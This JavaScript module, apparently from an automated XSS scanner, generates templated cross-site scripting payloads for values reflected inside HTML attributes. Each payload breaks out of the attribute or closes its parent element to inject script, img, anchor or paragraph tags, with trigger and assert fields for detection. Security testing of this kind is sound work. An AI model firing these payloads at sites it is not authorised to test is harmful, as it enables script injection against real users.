function htmlNormalAttributePayloads({reflection, scriptTag, imgTag, aTag, pTag, tagTrigger, assert}) {
    return [{
        payload: `">${scriptTag}`,
        assert,
    }, {
        payload: `">${imgTag}`,
        assert,
    }, {
        payload: `">${aTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `">${pTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${scriptTag}<${reflection.parentName} ${reflection.nodeName}="`,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${imgTag}<${reflection.parentName} ${reflection.nodeName}="`,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${aTag}<${reflection.parentName} ${reflection.nodeName}="`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${pTag}<${reflection.parentName} ${reflection.nodeName}="`,
        trigger: tagTrigger,
        assert,
    }];
}

module.exports = htmlNormalAttributePayloads;
